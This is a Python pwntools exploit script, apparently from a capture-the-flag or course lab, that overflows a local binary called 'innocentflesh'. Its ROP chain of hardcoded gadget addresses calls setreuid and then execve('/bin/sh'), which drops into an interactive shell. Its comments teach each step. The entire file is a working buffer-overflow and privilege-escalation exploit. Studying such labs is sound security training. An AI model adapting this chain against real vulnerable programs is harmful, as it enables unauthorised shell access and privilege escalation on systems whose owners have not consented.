#!/usr/bin/env python3
from pwn import *

context(arch="amd64", os="linux")


p=process("./innocentflesh")


# Use ropper to find such gadets. ropper -h for more details
# pop rdx; ret;
poprdx = p64(0x44b426)

# pop rsi; ret;
poprsi = p64(0x410093)

# pop rdi; ret;
poprdi = p64(0x4006A6)

# pop rax; ret;
poprax = p64(0x4005AF)

# find a memory section where you have write access
bssaddr = p64(0x6bb2E0)



# mov qword ptr [rsi], rax; ret;
riteaddr = p64(0x47F541)
offset = 56
gadgets = offset * b'\x90'


# Don’t forget you need to setreuid first …
gadgets += poprax + p64(0x71) + poprdi + p64(0x3f0) + poprsi + p64(0x3f0) + p64(0x474e15) + poprax + bytes('/bin/sh\0', 'ascii') + poprsi + bssaddr + riteaddr

# Here’s an example of assigning parameters of syscall
# set rsi and rdx to NULL
gadgets += poprsi
gadgets += p64(0)
gadgets += poprdx
gadgets += p64(0)

# Write /bin/sh into bss
#gadgets = poprdi + bssaddr + poprax + p64(0x3b) + p64(0x474e15)

gadgets += poprdi

gadgets += bssaddr

gadgets += poprax

gadgets += p64(0x3b)

gadgets += p64(0x474e15)


# set rdi to '/bin/sh' and make syscall
# sys_execve('/bin/sh', 0, 0)

p.sendline(gadgets)
p.interactive()

################
#Note: you can also use ROPgadets, ropper to directly build rop chain. But I think it is a enjoyable process building this on your own. 
#